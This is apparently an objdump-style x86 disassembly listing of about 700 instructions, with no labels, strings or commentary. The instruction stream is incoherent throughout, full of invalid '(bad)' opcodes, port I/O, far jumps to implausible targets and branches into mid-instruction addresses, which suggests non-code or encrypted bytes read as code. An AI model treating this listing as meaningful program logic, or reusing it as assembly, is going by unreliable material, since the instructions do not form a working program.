  40f9be:	mov    DWORD PTR [edx+0x24],0xc6dc7cf5
  40f9c5:	push   0xf0bbc219
  40f9ca:	push   esi
  40f9cb:	(bad)  [ebp-0x3213eae7]
  40f9d1:	push   esi
  40f9d2:	jns    0x40fa3e
  40f9d4:	xor    BYTE PTR [edx],ch
  40f9d6:	xor    al,0x60
  40f9d8:	add    cl,dh
  40f9da:	jo     0x40f99d
  40f9dc:	mov    ds:0xc8adcb68,al
  40f9e1:	fisttp WORD PTR [ebx+0x705af37]
  40f9e7:	sub    eax,0x3900ddfc
  40f9ec:	enter  0xf8d3,0xe9
  40f9f0:	xchg   BYTE PTR [ebp-0x42f56fbc],dl
  40f9f6:	iret   
  40f9f7:	mov    bl,0xe6
  40f9f9:	pop    es
  40f9fa:	sar    cl,1
  40f9fc:	test   eax,0x248cbf55
  40fa01:	fidivr WORD PTR [edx+0x6699871f]
  40fa07:	mov    ah,0xe7
  40fa09:	mov    ecx,0x5cc600e7
  40fa0e:	retf   
  40fa0f:	mov    edi,0xc3369b7c
  40fa14:	sub    BYTE PTR [eax],0x74
  40fa17:	idiv   dh
  40fa19:	sbb    ebx,DWORD PTR [ecx+0x1c]
  40fa1c:	mov    ecx,0x325be385
  40fa21:	adc    al,0xf6
  40fa23:	out    0x8b,al
  40fa25:	repnz out dx,al
  40fa27:	scas   eax,DWORD PTR es:[edi]
  40fa28:	loopne 0x40fa23
  40fa2a:	mov    eax,0xc1c40fbe
  40fa2f:	cmp    bh,cl
  40fa31:	test   edx,esi
  40fa33:	lahf   
  40fa34:	jl     0x40fa89
  40fa36:	inc    ebp
  40fa37:	adc    al,0x6c
  40fa39:	xor    ah,0x53
  40fa3c:	das    
  40fa3d:	imul   eax,DWORD PTR [ebp+0x21],0x5e8f0079
  40fa44:	fdiv   DWORD PTR [ecx-0x5d]
  40fa47:	daa    
  40fa48:	push   ecx
  40fa49:	adc    ecx,0x13
  40fa4c:	adc    edi,edx
  40fa4e:	into   
  40fa4f:	cmp    eax,0xa96d5031
  40fa54:	pusha  
  40fa55:	xor    eax,0x12e7be24
  40fa5a:	out    0x81,eax
  40fa5c:	dec    edx
  40fa5d:	(bad)  
  40fa5e:	std    
  40fa5f:	xchg   BYTE PTR ds:0xc884e2f,dl
  40fa65:	popa   
  40fa66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa67:	mov    cl,BYTE PTR [eax]
  40fa69:	push   esi
  40fa6a:	sub    al,cl
  40fa6c:	push   eax
  40fa6d:	fidivr DWORD PTR [ebx-0x2844e039]
  40fa73:	jbe    0x40fa30
  40fa75:	sbb    DWORD PTR [esi+0x343f7df4],0x29822f09
  40fa7f:	mov    ds:0x616c5c32,eax
  40fa84:	add    ebx,ebx
  40fa86:	jp     0x40fa34
  40fa88:	mov    WORD PTR [ecx+edi*2],ds
  40fa8b:	test   eax,0xf5cf3df8
  40fa90:	adc    DWORD PTR [edx-0x7ce7250b],0xffffffdf
  40fa97:	mov    al,0x17
  40fa99:	jecxz  0x40fa57
  40fa9b:	fiadd  DWORD PTR [esi+0x29ee7288]
  40faa1:	inc    ebx
  40faa2:	addr16 ret 
  40faa4:	and    al,0xf4
  40faa6:	push   0x7ba74de3
  40faab:	xor    DWORD PTR [edx],edx
  40faad:	sbb    ax,0x5a29
  40fab1:	mov    esp,0xfaaa5d4b
  40fab6:	jo     0x40faf4
  40fab8:	daa    
  40fab9:	call   0xedf88dec
  40fabe:	scas   al,BYTE PTR es:[edi]
  40fabf:	push   eax
  40fac0:	neg    eax
  40fac2:	push   ebx
  40fac3:	or     BYTE PTR [ebx+0x5f439727],ah
  40fac9:	cdq    
  40faca:	repnz pop ds
  40facc:	sbb    ah,cl
  40face:	and    BYTE PTR ds:0x303553f8,bl
  40fad4:	(bad)  
  40fad5:	fsubp  st(5),st
  40fad7:	sbb    al,0x2a
  40fad9:	fisub  DWORD PTR [ecx+0x36ccc136]
  40fadf:	push   eax
  40fae0:	mov    ebx,0x418d290b
  40fae5:	push   ecx
  40fae6:	pop    eax
  40fae7:	and    eax,0x9835380c
  40faec:	push   es
  40faed:	ss std 
  40faef:	sahf   
  40faf0:	popf   
  40faf1:	fidiv  DWORD PTR [ebx+0x67]
  40faf4:	mov    al,BYTE PTR [ecx-0x4e]
  40faf7:	mov    bl,0x7b
  40faf9:	inc    edi
  40fafa:	adc    BYTE PTR [ecx-0x4f],bh
  40fafd:	ja     0x40fad3
  40faff:	stos   DWORD PTR es:[edi],eax
  40fb00:	mov    ds:0x7f459396,eax
  40fb05:	dec    edx
  40fb06:	xor    BYTE PTR [ebx],bh
  40fb08:	jecxz  0x40fb16
  40fb0a:	jmp    0x48bb12f9
  40fb0f:	adc    ebp,DWORD PTR [edi]
  40fb11:	dec    ebp
  40fb12:	push   ds
  40fb13:	mov    ch,0xb4
  40fb15:	mov    dl,0xb1
  40fb17:	outs   dx,DWORD PTR ds:[esi]
  40fb18:	shl    eax,1
  40fb1a:	pop    es
  40fb1b:	and    esi,DWORD PTR [ebp-0x6f]
  40fb1e:	jne    0x40faa2
  40fb20:	pop    ds
  40fb21:	or     ebp,edx
  40fb23:	outs   dx,BYTE PTR ds:[esi]
  40fb24:	cmp    edx,esi
  40fb26:	call   0x652843bc
  40fb2b:	scas   al,BYTE PTR es:[edi]
  40fb2c:	jnp    0x40faba
  40fb2e:	pop    edx
  40fb2f:	mov    cs,edx
  40fb31:	cld    
  40fb32:	shl    BYTE PTR [ebp-0x615786a],1
  40fb38:	inc    eax
  40fb3a:	sbb    eax,0x1e32f741
  40fb3f:	mov    ds:0x67459fc4,eax
  40fb44:	mov    cl,0xc2
  40fb46:	aam    0x69
  40fb48:	mov    ds:0xa0e0519f,al
  40fb4d:	loop   0x40fb27
  40fb4f:	jns    0x40fb7c
  40fb51:	sahf   
  40fb52:	add    eax,0x2b09cf8e
  40fb57:	shl    BYTE PTR [edi],cl
  40fb59:	idiv   BYTE PTR [esi]
  40fb5b:	mov    eax,ds:0x3cfc0d8c
  40fb60:	and    esi,DWORD PTR [eax+0x6d]
  40fb63:	outs   dx,BYTE PTR ds:[esi]
  40fb64:	loop   0x40fb78
  40fb66:	rcl    DWORD PTR [edx-0x78],1
  40fb69:	xor    ah,ch
  40fb6b:	dec    ebp
  40fb6c:	in     al,0xf8
  40fb6e:	push   eax
  40fb6f:	add    DWORD PTR [ebx+0x45891fa0],ebp
  40fb75:	lods   eax,DWORD PTR ds:[esi]
  40fb76:	mov    eax,ds:0xa996b0de
  40fb7b:	and    al,0x9a
  40fb7d:	fnstcw WORD PTR [ebx-0x7]
  40fb80:	in     eax,0xdb
  40fb82:	cmp    BYTE PTR [eax+eiz*2-0x2c],dl
  40fb86:	fisttp DWORD PTR [edx-0x32fa28eb]
  40fb8c:	mov    ebp,es
  40fb8e:	js     0x40fb7f
  40fb90:	push   ebx
  40fb91:	adc    DWORD PTR [eax-0x77],ebp
  40fb94:	xchg   DWORD PTR [eax+0x4a],ebx
  40fb97:	cmp    al,0xbe
  40fb99:	mov    dl,0x2
  40fb9b:	outs   dx,DWORD PTR ds:[esi]
  40fb9c:	jp     0x40fbbb
  40fb9e:	ds (bad) 
  40fba1:	xor    al,0x82
  40fba3:	daa    
  40fba4:	sub    al,0x4f
  40fba6:	jb     0x2957d978
  40fbac:	cmp    ebp,DWORD PTR [edx]
  40fbae:	ret    
  40fbaf:	pushf  
  40fbb0:	inc    ebx
  40fbb1:	out    dx,al
  40fbb2:	mov    al,0xb5
  40fbb4:	nop
  40fbb5:	scas   al,BYTE PTR es:[edi]
  40fbb6:	mov    al,0xfb
  40fbb8:	mov    ch,0x14
  40fbba:	cli    
  40fbbb:	nop
  40fbbc:	and    BYTE PTR [eax+0x54],0x70
  40fbc0:	mov    eax,ds:0xdf3c802f
  40fbc5:	lods   al,BYTE PTR ds:[esi]
  40fbc6:	repz repz mov edi,0xdf4c4b9a
  40fbcd:	inc    eax
  40fbce:	in     eax,0x16
  40fbd0:	inc    edx
  40fbd1:	xor    DWORD PTR [ebp+0x5b],ecx
  40fbd4:	das    
  40fbd5:	mov    BYTE PTR [eax-0x13],dl
  40fbd8:	pop    ecx
  40fbd9:	jmp    0x40fbf2
  40fbdb:	fcom   st(2)
  40fbdd:	fwait
  40fbde:	and    al,0x16
  40fbe0:	ins    BYTE PTR es:[edi],dx
  40fbe1:	mov    edi,0xbf7f3263
  40fbe6:	jmp    0x2aed3c63
  40fbeb:	xor    BYTE PTR [esi],bl
  40fbed:	push   edx
  40fbee:	xchg   edi,eax
  40fbef:	aas    
  40fbf0:	mov    eax,0x11dcca38
  40fbf5:	xchg   edx,eax
  40fbf6:	xchg   esi,eax
  40fbf7:	dec    ebp
  40fbf8:	xchg   DWORD PTR [eax-0x77c55da8],ecx
  40fbfe:	or     ebx,DWORD PTR [eax]
  40fc00:	and    DWORD PTR ds:0xed43ed43,eax
  40fc06:	sbb    DWORD PTR [ecx+0x485de41],esp
  40fc0c:	add    al,0xce
  40fc0e:	or     al,0xfa
  40fc10:	loop   0x40fbc8
  40fc12:	retf   0x2919
  40fc15:	dec    ebp
  40fc16:	dec    edx
  40fc17:	or     al,0x68
  40fc19:	ds pop edx
  40fc1b:	pop    esi
  40fc1c:	xchg   ebp,eax
  40fc1d:	in     al,0xb
  40fc1f:	cmc    
  40fc20:	dec    esp
  40fc21:	out    dx,eax
  40fc22:	nop
  40fc23:	mov    cl,0x33
  40fc25:	jecxz  0x40fbdf
  40fc27:	nop
  40fc28:	and    al,cl
  40fc2a:	les    ebx,FWORD PTR [edi]
  40fc2c:	ins    BYTE PTR es:[edi],dx
  40fc2d:	rcl    BYTE PTR [edx+0x24],0x85
  40fc31:	dec    edi
  40fc32:	popf   
  40fc33:	jo     0x40fc45
  40fc35:	push   ebp
  40fc36:	enter  0xd21f,0xf0
  40fc3a:	pop    ss
  40fc3b:	(bad)  
  40fc3c:	jge    0x40fc5d
  40fc3e:	mov    ebp,0xf6a28a85
  40fc43:	aam    0x1a
  40fc45:	push   cs
  40fc46:	add    eax,0xfb10364
  40fc4b:	mov    ch,BYTE PTR [ecx+0x22]
  40fc4e:	inc    ebx
  40fc4f:	xchg   edx,eax
  40fc50:	popf   
  40fc51:	dec    edi
  40fc52:	(bad)  
  40fc53:	xchg   ebp,eax
  40fc54:	rol    edx,1
  40fc56:	jge    0x40fc74
  40fc58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc59:	mov    DWORD PTR [edx-0xd],edx
  40fc5c:	dec    eax
  40fc5d:	and    al,0xc2
  40fc5f:	mov    dl,0xd5
  40fc61:	retf   
  40fc62:	fwait
  40fc63:	xor    ah,BYTE PTR [esi]
  40fc65:	je     0x40fcc0
  40fc67:	mov    al,ds:0xa1fe8299
  40fc6c:	(bad)  
  40fc6d:	loope  0x40fc12
  40fc6f:	inc    eax
  40fc70:	or     BYTE PTR [ebx-0x46de49db],dh
  40fc76:	fucom  st(1)
  40fc78:	xlat   BYTE PTR ds:[ebx]
  40fc79:	hlt    
  40fc7a:	xchg   edx,eax
  40fc7b:	jl     0x40fc44
  40fc7d:	sbb    eax,0xd64bb7e3
  40fc82:	pop    esi
  40fc83:	or     al,0xb6
  40fc85:	jle    0x40fce7
  40fc87:	add    bl,BYTE PTR [esp+ebx*1-0x20]
  40fc8b:	xchg   esi,eax
  40fc8c:	pusha  
  40fc8d:	aaa    
  40fc8e:	push   es
  40fc8f:	mov    ebp,0x1632eae4
  40fc94:	lods   eax,DWORD PTR ds:[esi]
  40fc95:	inc    esp
  40fc96:	fwait
  40fc97:	ds sub eax,0x47abf371
  40fc9d:	jbe    0x40fcdd
  40fc9f:	xchg   edi,eax
  40fca0:	pop    ebp
  40fca1:	mov    WORD PTR [eax-0x35],?
  40fca4:	xchg   esi,eax
  40fca5:	call   0xf98a:0xf4b13b8f
  40fcac:	xchg   ebp,eax
  40fcad:	or     DWORD PTR [edi],0xc6b42b6e
  40fcb3:	into   
  40fcb4:	adc    BYTE PTR [eax+ebx*8+0x52],cl
  40fcb8:	sbb    al,0x8e
  40fcba:	test   BYTE PTR [edx],0xa8
  40fcbd:	stc    
  40fcbe:	imul   edx,DWORD PTR [ebx],0x3024f9e6
  40fcc4:	jns    0x40fd09
  40fcc6:	mov    cl,BYTE PTR [ecx-0x33]
  40fcc9:	aas    
  40fcca:	test   eax,0x8471495b
  40fccf:	push   0x21
  40fcd1:	and    DWORD PTR [ebp+0x7e],ebx
  40fcd4:	xchg   edx,eax
  40fcd5:	and    BYTE PTR [ebx+0x268bfe8b],al
  40fcdb:	(bad)  
  40fcdc:	xor    bl,cl
  40fcde:	sar    edi,cl
  40fce0:	sub    ch,dl
  40fce2:	xor    eax,0x268aa511
  40fce7:	xlat   BYTE PTR ds:[ebx]
  40fce8:	xor    al,0x68
  40fcea:	mov    ecx,0xbf948aba
  40fcef:	pop    esp
  40fcf0:	mov    ebx,0x16670f03
  40fcf5:	jecxz  0x40fca9
  40fcf7:	jne    0x40fd18
  40fcf9:	jb     0x40fd4d
  40fcfb:	add    BYTE PTR [eax+eiz*4],ah
  40fcfe:	repz inc esp
  40fd00:	pop    es
  40fd01:	aaa    
  40fd02:	out    0x47,eax
  40fd04:	imul   esi,edi,0xd28cf
  40fd0a:	push   ds
  40fd0b:	and    eax,0x16ba12c6
  40fd10:	aas    
  40fd11:	pop    ds
  40fd12:	mov    eax,ds:0xaf81b939
  40fd17:	stos   DWORD PTR es:[edi],eax
  40fd18:	xor    al,0x85
  40fd1a:	ret    0x929e
  40fd1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd1e:	out    dx,eax
  40fd1f:	add    DWORD PTR [ebp+0x3c],ebx
  40fd22:	lods   al,BYTE PTR ds:[esi]
  40fd23:	cmp    BYTE PTR [esi],cl
  40fd25:	nop
  40fd26:	dec    ebx
  40fd27:	pop    esi
  40fd28:	cmp    esi,DWORD PTR [ecx+0x54]
  40fd2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd2c:	dec    ecx
  40fd2d:	test   DWORD PTR [ecx-0x1c805ff1],esi
  40fd33:	mov    al,0x6e
  40fd35:	inc    ebx
  40fd36:	std    
  40fd37:	xor    esp,DWORD PTR [eax-0xf]
  40fd3a:	out    dx,al
  40fd3b:	or     DWORD PTR [edx],esi
  40fd3d:	aam    0x22
  40fd3f:	dec    esp
  40fd40:	adc    esp,ecx
  40fd42:	or     ecx,DWORD PTR [edi-0x7622eb7f]
  40fd48:	jne    0x40fd35
  40fd4a:	pop    ebp
  40fd4b:	iret   
  40fd4c:	cwde   
  40fd4d:	mov    ds:0x1a1b3bf7,eax
  40fd52:	lds    ebx,FWORD PTR [edi+0x3231b654]
  40fd58:	pop    eax
  40fd59:	stos   DWORD PTR es:[edi],eax
  40fd5a:	test   BYTE PTR [eax+0x68092e40],dl
  40fd60:	aad    0x99
  40fd62:	shr    BYTE PTR [edx-0x749ec486],cl
  40fd68:	js     0x40fd72
  40fd6a:	push   cs
  40fd6b:	retf   0x582f
  40fd6e:	mov    ebx,0xd6aeb435
  40fd73:	fst    DWORD PTR [eax-0x52a14db7]
  40fd79:	or     ebp,DWORD PTR [ebp+0x63]
  40fd7c:	sti    
  40fd7d:	jp     0x40fd88
  40fd7f:	mov    dh,0xd9
  40fd81:	call   0xf39483f2
  40fd86:	xor    BYTE PTR [esi-0x569ddf3],ah
  40fd8c:	out    0xcd,al
  40fd8e:	xchg   edx,eax
  40fd8f:	and    ecx,edi
  40fd91:	or     al,0x75
  40fd93:	ret    
  40fd94:	cld    
  40fd95:	pushf  
  40fd96:	mov    eax,ds:0xb0b310a1
  40fd9b:	lods   eax,DWORD PTR ds:[esi]
  40fd9c:	fist   WORD PTR es:[esi+ecx*1+0x1e555823]
  40fda4:	pop    esi
  40fda5:	jge    0x40fd5e
  40fda7:	in     al,dx
  40fda8:	repnz sbb eax,0xdf8ef52f
  40fdae:	mov    esp,0xa4225aed
  40fdb3:	xlat   BYTE PTR ds:[ebx]
  40fdb4:	out    0xdf,eax
  40fdb6:	into   
  40fdb7:	pop    es
  40fdb8:	inc    ecx
  40fdb9:	fdivr  DWORD PTR [edi]
  40fdbb:	mov    BYTE PTR [ebx+0x1b99bc2],ah
  40fdc1:	xchg   DWORD PTR [edx+ebx*2+0x1d],ebp
  40fdc5:	cmp    BYTE PTR [edi-0x1b],dl
  40fdc8:	pop    ebx
  40fdc9:	rol    al,cl
  40fdcb:	or     al,0x4d
  40fdcd:	jno    0x40fda0
  40fdcf:	fmulp  st(2),st
  40fdd1:	lock pushf 
  40fdd3:	cdq    
  40fdd4:	ret    0x8c2a
  40fdd7:	dec    eax
  40fdd8:	jl     0x40fe3f
  40fdda:	imul   esp,DWORD PTR [eax],0xef51e8fa
  40fde0:	dec    ebx
  40fde1:	ret    
  40fde2:	dec    ebp
  40fde3:	pusha  
  40fde4:	jg     0x40fdac
  40fde6:	xchg   BYTE PTR [esi+0x7dfddd1f],ch
  40fdec:	push   ebx
  40fded:	push   ecx
  40fdee:	fstp   st(5)
  40fdf0:	pushf  
  40fdf1:	jnp    0x40fdab
  40fdf3:	fisubr WORD PTR [esp+edx*4-0x3b]
  40fdf7:	dec    edx
  40fdf8:	repnz stos BYTE PTR es:[edi],al
  40fdfa:	or     BYTE PTR [edx+0x35deca5d],bh
  40fe00:	int3   
  40fe01:	leave  
  40fe02:	(bad)  
  40fe03:	lods   eax,DWORD PTR ds:[esi]
  40fe04:	shl    DWORD PTR ds:0x5f2c688f,1
  40fe0a:	jle    0x40fdde
  40fe0c:	ss or  al,0x4b
  40fe0f:	daa    
  40fe10:	adc    eax,0x66bd775c
  40fe15:	xchg   ebx,eax
  40fe16:	xchg   edx,eax
  40fe17:	inc    esp
  40fe18:	out    0xd4,eax
  40fe1a:	jmp    0x1a6f:0x11a46f95
  40fe21:	mov    al,ds:0x91e7a7e3
  40fe26:	cmp    eax,0x93dc6d23
  40fe2b:	test   al,0x64
  40fe2d:	ret    
  40fe2e:	adc    ecx,DWORD PTR [ecx-0x132e0526]
  40fe34:	push   ebp
  40fe35:	mov    dh,0x56
  40fe37:	jmp    0x8c608a53
  40fe3c:	jne    0x40feae
  40fe3e:	imul   ebx,DWORD PTR [ebp-0x624be81],0xcfb4f632
  40fe48:	pop    esi
  40fe49:	inc    BYTE PTR [eax]
  40fe4b:	inc    esp
  40fe4c:	push   ds
  40fe4d:	xchg   al,dl
  40fe4f:	(bad)  
  40fe50:	sub    al,0x93
  40fe52:	pushf  
  40fe53:	(bad)  
  40fe54:	sub    al,0x5e
  40fe56:	lods   eax,DWORD PTR ds:[esi]
  40fe57:	retf   
  40fe58:	jmp    0xa0bb7bd7
  40fe5d:	loop   0x40fe77
  40fe5f:	int    0x42
  40fe61:	xlat   BYTE PTR ds:[ebx]
  40fe62:	sbb    BYTE PTR [eax-0x20],bh
  40fe65:	jno    0x40fe7d
  40fe67:	ret    0xceb1
  40fe6a:	xor    BYTE PTR [edi],ch
  40fe6c:	dec    DWORD PTR [eax-0x17f2a2f]
  40fe72:	inc    edx
  40fe73:	adc    edi,DWORD PTR [esi+0x355592d]
  40fe79:	jle    0x40fef9
  40fe7b:	dec    edi
  40fe7c:	sbb    dl,bh
  40fe7e:	je     0x40fe29
  40fe80:	push   es
  40fe81:	gs jl  0x40fe31
  40fe84:	(bad)  
  40fe85:	mov    esp,0xf477392b
  40fe8a:	out    0x23,al
  40fe8c:	push   ecx
  40fe8d:	jge    0x40fea7
  40fe8f:	icebp  
  40fe90:	push   ebp
  40fe91:	std    
  40fe92:	lea    ebp,[edx+ebp*2+0x78]
  40fe96:	fadd   QWORD PTR [esi+0x2c]
  40fe99:	in     eax,0xa2
  40fe9b:	and    ecx,edx
  40fe9d:	or     BYTE PTR [ecx+ecx*8],ch
  40fea0:	fisub  WORD PTR [ecx+0x5d]
  40fea3:	jg     0x40fe4a
  40fea5:	fild   DWORD PTR ds:0x4fb30456
  40feab:	push   eax
  40feac:	jno    0x40fe93
  40feae:	in     eax,dx
  40feaf:	cli    
  40feb0:	jnp    0x40ff13
  40feb2:	les    edi,FWORD PTR [esi+0x1cdeb630]
  40feb8:	addr16 push cs
  40feba:	mov    bh,0x63
  40febc:	pushf  
  40febd:	test   eax,0xc57ec1ae
  40fec2:	call   0xfa4a3280
  40fec7:	clc    
  40fec8:	jle    0x40fe65
  40feca:	cld    
  40fecb:	add    dh,ah
  40fecd:	aam    0x71
  40fecf:	and    al,0x1a
  40fed1:	dec    edx
  40fed2:	imul   eax,DWORD PTR [edx],0x3a
  40fed5:	add    BYTE PTR [ecx-0x2b],ah
  40fed8:	shl    BYTE PTR [edx+0x4a],cl
  40fedb:	jb     0x40ff52
  40fedd:	jge    0x40feb1
  40fedf:	fisttp WORD PTR [edx]
  40fee1:	cmp    ebp,DWORD PTR [ebx]
  40fee3:	xchg   ecx,eax
  40fee4:	cmp    al,0xb7
  40fee6:	leave  
  40fee7:	jnp    0x40fed6
  40fee9:	jmp    FWORD PTR [ebp+0x65d02b96]
  40feef:	pop    es
  40fef0:	loopne 0x40fee9
  40fef2:	jmp    0x25b6:0x70498b7e
  40fef9:	or     eax,0x3095922d
  40fefe:	dec    ebp
  40feff:	jmp    0xd93eb804
  40ff04:	aas    
  40ff05:	mov    edx,0x72ef1db9
  40ff0a:	push   0xdab9b8e5
  40ff0f:	aaa    
  40ff10:	fbld   TBYTE PTR [ecx-0x60]
  40ff13:	mov    eax,ds:0xc7dbb16f
  40ff18:	imul   ecx,DWORD PTR [edi+0x7bc17984],0xd5acc00e
  40ff22:	add    al,0xba
  40ff24:	or     esp,edi
  40ff26:	mov    ebp,0x42628390
  40ff2b:	ins    BYTE PTR es:[edi],dx
  40ff2c:	cmp    DWORD PTR [edi+0x46ea27a9],edi
  40ff32:	adc    esp,ebp
  40ff34:	fmul   QWORD PTR [ebp-0x37]
  40ff37:	pop    esp
  40ff38:	ret    
  40ff39:	sbb    cl,BYTE PTR [esi-0x517297c5]
  40ff3f:	mov    ds:0xa03c4090,al
  40ff44:	aad    0xd9
  40ff46:	loopne 0x40ff06
  40ff48:	aas    
  40ff49:	or     edx,esp
  40ff4b:	jle    0x40feea
  40ff4d:	mov    esp,DWORD PTR [ecx]
  40ff4f:	push   edi
  40ff50:	in     al,dx
  40ff51:	adc    ebp,DWORD PTR [ebx+eax*2]
  40ff54:	mov    WORD PTR [esi+ecx*8-0x3a],fs
  40ff58:	aaa    
  40ff59:	or     ch,BYTE PTR [eax]
  40ff5b:	out    dx,eax
  40ff5c:	pop    eax
  40ff5d:	mov    cl,BYTE PTR [eax+0x61]
  40ff60:	popf   
  40ff61:	sbb    al,0x14
  40ff63:	(bad)  
  40ff65:	enter  0xdf83,0x2e
  40ff69:	push   0xffffffef
  40ff6b:	push   cs
  40ff6c:	int    0x51
  40ff6e:	sbb    edx,eax
  40ff70:	loop   0x40ff4b
  40ff72:	out    dx,eax
  40ff73:	jmp    0x51e2:0xe5718e09
  40ff7a:	jp     0x40ff99
  40ff7c:	push   cs
  40ff7d:	ins    DWORD PTR es:[edi],dx
  40ff7e:	or     bl,BYTE PTR [esi-0x1009bbf8]
  40ff84:	jb     0x40fffe
  40ff86:	mov    DWORD PTR [ebp-0x43],ebx
  40ff89:	stos   BYTE PTR es:[edi],al
  40ff8a:	push   esi
  40ff8b:	xor    ch,dl
  40ff8d:	rol    BYTE PTR [edi],cl
  40ff8f:	inc    ebp
  40ff90:	mov    dh,0xdf
  40ff92:	loopne 0x40ff56
  40ff94:	lds    edx,FWORD PTR cs:[esi+0x52aa4a75]
  40ff9b:	jp     0x40ff85
  40ff9d:	ss rcl ah,cl
  40ffa0:	add    al,0x84
  40ffa2:	push   edx
  40ffa3:	add    BYTE PTR [eax+0x35],bh
  40ffa6:	ror    DWORD PTR [eax-0x6e6a9357],1
  40ffac:	out    dx,al
  40ffad:	ins    DWORD PTR es:[edi],dx
  40ffae:	icebp  
  40ffaf:	ret    
  40ffb0:	jb     0x40ff73
  40ffb2:	sbb    al,0x46
  40ffb4:	dec    edx
  40ffb5:	xchg   esp,eax
  40ffb6:	mov    ah,al
  40ffb8:	push   eax
  40ffb9:	sbb    bh,BYTE PTR [ebx+esi*4-0x56]
  40ffbd:	sub    ch,al
  40ffbf:	test   BYTE PTR [ebx-0x5a],ah
  40ffc2:	jl     0x410035
  40ffc4:	out    0xae,eax
  40ffc6:	xor    DWORD PTR [ebx],0xc1201674
  40ffcc:	dec    ecx
  40ffcd:	in     al,dx
  40ffce:	das    
  40ffcf:	loopne 0x41004f
  40ffd1:	adc    eax,0xcda56876
  40ffd6:	inc    esp
  40ffd7:	ins    BYTE PTR es:[edi],dx
  40ffd8:	mov    dl,0xe
  40ffda:	xchg   ebx,eax
  40ffdb:	mov    esp,0xdf9be5a3
  40ffe0:	ins    BYTE PTR es:[edi],dx
  40ffe1:	pop    ecx
  40ffe2:	imul   edx,DWORD PTR [esi+edx*1-0x3e2349dc],0xffffffce
  40ffea:	mov    dl,0xc0
  40ffec:	mov    ebx,0x96fdab4d
  40fff1:	push   es
  40fff2:	adc    edi,edi
  40fff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fff5:	dec    ebp
  40fff6:	xor    ecx,DWORD PTR [edi+edi*4+0x46]
  40fffa:	sbb    BYTE PTR [ebp-0x6a],0xe9
  40fffe:	pop    eax
  40ffff:	jle    0x41001a
  410001:	mov    dl,0xfe
  410003:	mov    ebp,0x9c69e599
  410008:	mov    DWORD PTR [ebx],0x2ded534f
  41000e:	inc    ebp
  41000f:	dec    ebp
  410010:	lods   al,BYTE PTR ds:[esi]
  410011:	fsubr  QWORD PTR [edi+0x64]
  410014:	jnp    0x410028
  410016:	and    ebp,DWORD PTR [esi]
  410018:	mov    esp,0x83357053
  41001d:	addr16 inc ebx
  41001f:	mov    eax,ds:0xf81e064e
  410024:	shl    BYTE PTR [esi-0xe5d5e56],1
  41002a:	jmp    0x41004a
  41002c:	jl     0x40ffef
  41002e:	stc    
  41002f:	mov    ds,WORD PTR [ebx-0x471a109f]
  410035:	sub    edi,DWORD PTR [esi+ecx*2+0x52]
  410039:	push   ebx
  41003a:	(bad)  
  41003b:	xor    BYTE PTR [ebx+0x30a38de],al
  410041:	pop    ss
  410042:	and    al,0x2c
  410044:	inc    esi
  410046:	pop    ebp
  410047:	je     0x4100c1
  410049:	dec    eax
  41004a:	mov    bh,0xf9
  41004c:	add    ch,BYTE PTR [ecx+0x5b]
  41004f:	shr    DWORD PTR [ecx],0x66
  410052:	mov    WORD PTR [ebp+0x1d],es
  410055:	fdivr  QWORD PTR [ebx-0x52]
  410058:	push   esp
  410059:	inc    esi
  41005a:	aaa    
  41005b:	lea    esi,[ebx+0x33]
  41005e:	pop    edx
  41005f:	adc    al,BYTE PTR [ebp+0x223be38c]
  410065:	jbe    0x4100c8
  410067:	sub    bh,BYTE PTR [edx-0x4]
  41006a:	xchg   ebx,eax
  41006b:	(bad)  
  41006c:	adc    al,0xe5
  41006e:	mov    cl,0x55
  410070:	cmp    eax,0xc75592a3
  410075:	mov    ds:0x638457cd,eax
  41007a:	xor    BYTE PTR [edx],cl
  41007c:	es je  0x41005e
  41007f:	sub    BYTE PTR [ebx-0x7064e573],0x6d
  410086:	xchg   ebp,eax
  410087:	sub    bh,BYTE PTR [ebx]
  410089:	test   eax,0x66c6a01c
  41008e:	cmp    eax,DWORD PTR [edi+ebx*2+0x77de96e]
  410095:	and    DWORD PTR [edx+ebx*8],0xfbc7f010
  41009c:	ret    
  41009d:	loope  0x4100f6
  41009f:	mov    eax,0x967e6373
  4100a4:	xchg   esp,eax
  4100a5:	pusha  
  4100a6:	sbb    bh,BYTE PTR [edi+0x619e9654]
  4100ac:	out    dx,eax
  4100ad:	lds    ebp,FWORD PTR fs:[ecx+0x15c33d2c]
  4100b4:	add    al,0x2f
  4100b6:	xor    edx,eax
  4100b8:	mov    bl,0x8
  4100ba:	(bad)  
  4100bb:	pop    esi
  4100bc:	ja     0x410081
  4100be:	into   
  4100bf:	in     al,0x98
  4100c1:	sub    esi,DWORD PTR [ebx-0x38c1885]
  4100c7:	lods   eax,DWORD PTR ds:[esi]
  4100c8:	mov    BYTE PTR [eax+0x11],0xd6
  4100cc:	lods   eax,DWORD PTR ds:[esi]
  4100cd:	clc    
  4100ce:	sub    esp,DWORD PTR [edx+0x158ca951]
  4100d4:	mov    eax,ds:0x3ceaa017
  4100d9:	rcl    DWORD PTR [ebx-0x75],cl
  4100dc:	ret    
  4100dd:	fsubr  DWORD PTR [edi+0x59]
  4100e0:	imul   ecx,DWORD PTR [ecx+ebp*4]
  4100e4:	mov    ebx,eax
  4100e6:	push   0xffffffe0
  4100e8:	xor    eax,0x3725e58
  4100ed:	mov    eax,0xaa78e4f9
  4100f2:	push   ss
  4100f3:	push   esi
  4100f4:	iret   
  4100f5:	cli    
  4100f6:	xchg   esp,eax
  4100f7:	ds dec edi
  4100f9:	jecxz  0x41015f
  4100fb:	scas   al,BYTE PTR es:[edi]
  4100fc:	mov    ebx,DWORD PTR [ebp+0x4]
  4100ff:	push   ebx
  410100:	or     DWORD PTR [esi+0x5f],eax
  410103:	je     0x41013d
  410105:	dec    esi
  410106:	rol    dl,0xb1
  410109:	adc    eax,0x11e5fe62
  41010e:	mov    BYTE PTR [ebx-0x67],bh
  410111:	adc    cl,BYTE PTR fs:[ecx]
  410114:	and    eax,0x180814bc
  410119:	jp     0x41009b
  41011b:	add    al,0xb2
  41011d:	aaa    
  41011e:	out    0xf0,al
  410120:	ins    DWORD PTR es:[edi],dx
  410121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410122:	in     eax,dx
  410123:	xor    al,0xa0
